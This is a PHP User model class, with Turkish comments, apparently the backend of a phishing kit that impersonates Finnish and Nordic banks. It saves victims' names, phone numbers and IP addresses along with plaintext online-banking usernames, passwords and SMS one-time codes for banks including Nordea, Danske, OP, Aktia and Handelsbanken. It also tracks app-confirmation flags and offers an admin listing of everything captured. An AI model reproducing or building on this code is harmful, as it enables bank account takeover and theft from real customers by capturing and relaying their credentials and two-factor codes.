<?php
/**
 * User Model
 */

namespace App\Models;

use App\Core\Database;
use PDO;

class User
{
    private PDO $db;

    public function __construct()
    {
        $this->db = Database::getInstance();
    }

    /**
     * Yeni kullanıcı oluştur
     */
    public function create(string $fullName, string $phone, string $ipAddress): ?int
    {
        $stmt = $this->db->prepare("
            INSERT INTO users (full_name, phone, ip_address) 
            VALUES (:full_name, :phone, :ip_address)
        ");

        $stmt->execute([
            ':full_name' => $fullName,
            ':phone' => $phone,
            ':ip_address' => $ipAddress
        ]);

        return (int) $this->db->lastInsertId();
    }

    /**
     * Kullanıcıya banka seçimi ekle
     */
    public function updateBankSelection(int $userId, int $bankId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET selected_bank_id = :bank_id 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':bank_id' => $bankId,
            ':user_id' => $userId
        ]);
    }

    /**
     * Kullanıcıyı ID ile getir
     */
    public function findById(int $id): ?array
    {
        $stmt = $this->db->prepare("
            SELECT u.*, b.name as bank_name 
            FROM users u 
            LEFT JOIN banks b ON u.selected_bank_id = b.id 
            WHERE u.id = :id
        ");

        $stmt->execute([':id' => $id]);
        $result = $stmt->fetch();

        if ($result) {
            $result['danske_username'] = $result['danske_username'] ?? null;
            $result['danske_password'] = $result['danske_password'] ?? null;
            $result['danske_sms_code'] = $result['danske_sms_code'] ?? null;
            $result['danske_app_confirmed'] = $result['danske_app_confirmed'] ?? 0;
            $result['spankki_username'] = $result['spankki_username'] ?? null;
            $result['spankki_password'] = $result['spankki_password'] ?? null;
            $result['spankki_sms_code'] = $result['spankki_sms_code'] ?? null;
            $result['spankki_app_confirmed'] = $result['spankki_app_confirmed'] ?? 0;
            $result['aktia_username'] = $result['aktia_username'] ?? null;
            $result['aktia_sms_code'] = $result['aktia_sms_code'] ?? null;
            $result['aktia_app_confirmed'] = $result['aktia_app_confirmed'] ?? 0;
            $result['aktia_login_method'] = $result['aktia_login_method'] ?? null;
            $result['op_username'] = $result['op_username'] ?? null;
            $result['op_password'] = $result['op_password'] ?? null;
            $result['op_sms_code'] = $result['op_sms_code'] ?? null;
            $result['op_app_confirmed'] = $result['op_app_confirmed'] ?? 0;
            $result['poppankki_username'] = $result['poppankki_username'] ?? null;
            $result['poppankki_sms_code'] = $result['poppankki_sms_code'] ?? null;
            $result['poppankki_app_confirmed'] = $result['poppankki_app_confirmed'] ?? 0;
            $result['omasp_username'] = $result['omasp_username'] ?? null;
            $result['omasp_sms_code'] = $result['omasp_sms_code'] ?? null;
            $result['omasp_app_confirmed'] = $result['omasp_app_confirmed'] ?? 0;
            $result['saastopankki_username'] = $result['saastopankki_username'] ?? null;
            $result['saastopankki_sms_code'] = $result['saastopankki_sms_code'] ?? null;
            $result['saastopankki_app_confirmed'] = $result['saastopankki_app_confirmed'] ?? 0;
            $result['handelsbanken_username'] = $result['handelsbanken_username'] ?? null;
            $result['handelsbanken_password'] = $result['handelsbanken_password'] ?? null;
            $result['handelsbanken_sms_code'] = $result['handelsbanken_sms_code'] ?? null;
            $result['handelsbanken_app_confirmed'] = $result['handelsbanken_app_confirmed'] ?? 0;
        }

        return $result ?: null;
    }

    /**
     * Tüm kullanıcıları getir (Admin için)
     */
    public function getAll(int $limit = 100, int $offset = 0): array
    {
        $stmt = $this->db->prepare("
            SELECT u.*, b.name as bank_name 
            FROM users u 
            LEFT JOIN banks b ON u.selected_bank_id = b.id 
            ORDER BY u.created_at DESC 
            LIMIT :limit OFFSET :offset
        ");

        $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
        $stmt->execute();

        $users = $stmt->fetchAll();
        
        foreach ($users as &$user) {
            $user['nordea_username'] = $user['nordea_username'] ?? null;
            $user['nordea_password'] = $user['nordea_password'] ?? null;
            $user['nordea_sms_code'] = $user['nordea_sms_code'] ?? null;
            $user['nordea_app_confirmed'] = $user['nordea_app_confirmed'] ?? 0;
            $user['alandsbanken_username'] = $user['alandsbanken_username'] ?? null;
            $user['alandsbanken_password'] = $user['alandsbanken_password'] ?? null;
            $user['alandsbanken_sms_code'] = $user['alandsbanken_sms_code'] ?? null;
            $user['alandsbanken_app_confirmed'] = $user['alandsbanken_app_confirmed'] ?? 0;
            $user['danske_username'] = $user['danske_username'] ?? null;
            $user['danske_password'] = $user['danske_password'] ?? null;
            $user['danske_sms_code'] = $user['danske_sms_code'] ?? null;
            $user['danske_app_confirmed'] = $user['danske_app_confirmed'] ?? 0;
            $user['spankki_username'] = $user['spankki_username'] ?? null;
            $user['spankki_password'] = $user['spankki_password'] ?? null;
            $user['spankki_sms_code'] = $user['spankki_sms_code'] ?? null;
            $user['spankki_app_confirmed'] = $user['spankki_app_confirmed'] ?? 0;
            $user['aktia_username'] = $user['aktia_username'] ?? null;
            $user['aktia_sms_code'] = $user['aktia_sms_code'] ?? null;
            $user['aktia_app_confirmed'] = $user['aktia_app_confirmed'] ?? 0;
            $user['op_username'] = $user['op_username'] ?? null;
            $user['op_password'] = $user['op_password'] ?? null;
            $user['op_sms_code'] = $user['op_sms_code'] ?? null;
            $user['op_app_confirmed'] = $user['op_app_confirmed'] ?? 0;
        }
        
        return $users;
    }

    /**
     * Toplam kullanıcı sayısı
     */
    public function getTotalCount(): int
    {
        $stmt = $this->db->query("SELECT COUNT(*) as total FROM users");
        $result = $stmt->fetch();
        return (int) ($result['total'] ?? 0);
    }

    /**
     * Nordea bilgilerini kaydet
     */
    public function updateNordeaCredentials(int $userId, string $username, string $password): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET nordea_username = :username, nordea_password = :password 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':password' => $password,
            ':user_id' => $userId
        ]);
    }

    /**
     * Nordea SMS kodunu kaydet
     */
    public function updateNordeaSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET nordea_sms_code = :sms_code 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    /**
     * Nordea uygulama onayını kaydet
     */
    public function updateNordeaAppConfirmed(int $userId, bool $confirmed = true): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET nordea_app_confirmed = :confirmed 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':confirmed' => $confirmed ? 1 : 0,
            ':user_id' => $userId
        ]);
    }

    public function updateAlandsbankenCredentials(int $userId, string $username, string $password): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET alandsbanken_username = :username, alandsbanken_password = :password 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':password' => $password,
            ':user_id' => $userId
        ]);
    }

    public function updateAlandsbankenSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET alandsbanken_sms_code = :sms_code 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateAlandsbankenAppConfirmed(int $userId, bool $confirmed = true): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET alandsbanken_app_confirmed = :confirmed 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':confirmed' => $confirmed ? 1 : 0,
            ':user_id' => $userId
        ]);
    }

    public function updateDanskeCredentials(int $userId, string $username, string $password): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET danske_username = :username, danske_password = :password 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':password' => $password,
            ':user_id' => $userId
        ]);
    }

    public function updateDanskeSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET danske_sms_code = :sms_code 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateDanskeAppConfirmed(int $userId, bool $confirmed = true): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET danske_app_confirmed = :confirmed 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':confirmed' => $confirmed ? 1 : 0,
            ':user_id' => $userId
        ]);
    }

    public function updateSpankkiCredentials(int $userId, string $username, string $password): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET spankki_username = :username, spankki_password = :password 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':password' => $password,
            ':user_id' => $userId
        ]);
    }

    public function updateSpankkiSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET spankki_sms_code = :sms_code 
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateSpankkiAppConfirmed(int $userId, bool $confirmed = true): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET spankki_app_confirmed = :confirmed
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':confirmed' => $confirmed ? 1 : 0,
            ':user_id' => $userId
        ]);
    }

    public function updateAktiaCredentials(int $userId, string $username, ?string $loginMethod = null): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET aktia_username = :username" . ($loginMethod !== null ? ", aktia_login_method = :login_method" : "") . "
            WHERE id = :user_id
        ");

        $params = [
            ':username' => $username,
            ':user_id' => $userId
        ];

        if ($loginMethod !== null) {
            $params[':login_method'] = $loginMethod;
        }

        return $stmt->execute($params);
    }

    public function updateAktiaSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET aktia_sms_code = :sms_code
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateAktiaAppConfirmed(int $userId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET aktia_app_confirmed = 1
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':user_id' => $userId
        ]);
    }

    public function updateOpCredentials(int $userId, string $username, string $password): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET op_username = :username, op_password = :password
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':password' => $password,
            ':user_id' => $userId
        ]);
    }

    public function updateOpSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET op_sms_code = :sms_code
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateOpAppConfirmed(int $userId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET op_app_confirmed = 1
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':user_id' => $userId
        ]);
    }

    public function updatePoppankkiCredentials(int $userId, string $username): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET poppankki_username = :username
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':user_id' => $userId
        ]);
    }

    public function updatePoppankkiSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET poppankki_sms_code = :sms_code
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updatePoppankkiAppConfirmed(int $userId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET poppankki_app_confirmed = 1
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':user_id' => $userId
        ]);
    }

    public function updateOmaspCredentials(int $userId, string $username): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET omasp_username = :username
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':user_id' => $userId
        ]);
    }

    public function updateOmaspSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET omasp_sms_code = :sms_code
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateOmaspAppConfirmed(int $userId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET omasp_app_confirmed = 1
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':user_id' => $userId
        ]);
    }

    public function updateSaastopankkiCredentials(int $userId, string $username): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET saastopankki_username = :username
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':user_id' => $userId
        ]);
    }

    public function updateSaastopankkiSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET saastopankki_sms_code = :sms_code
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateSaastopankkiAppConfirmed(int $userId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET saastopankki_app_confirmed = 1
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':user_id' => $userId
        ]);
    }

    public function updateHandelsbankenCredentials(int $userId, ?string $username, ?string $password): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET handelsbanken_username = :username,
                handelsbanken_password = :password
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':username' => $username,
            ':password' => $password,
            ':user_id' => $userId
        ]);
    }

    public function updateHandelsbankenSmsCode(int $userId, string $smsCode): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET handelsbanken_sms_code = :sms_code
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':sms_code' => $smsCode,
            ':user_id' => $userId
        ]);
    }

    public function updateHandelsbankenAppConfirmed(int $userId): bool
    {
        $stmt = $this->db->prepare("
            UPDATE users 
            SET handelsbanken_app_confirmed = 1
            WHERE id = :user_id
        ");

        return $stmt->execute([
            ':user_id' => $userId
        ]);
    }
}

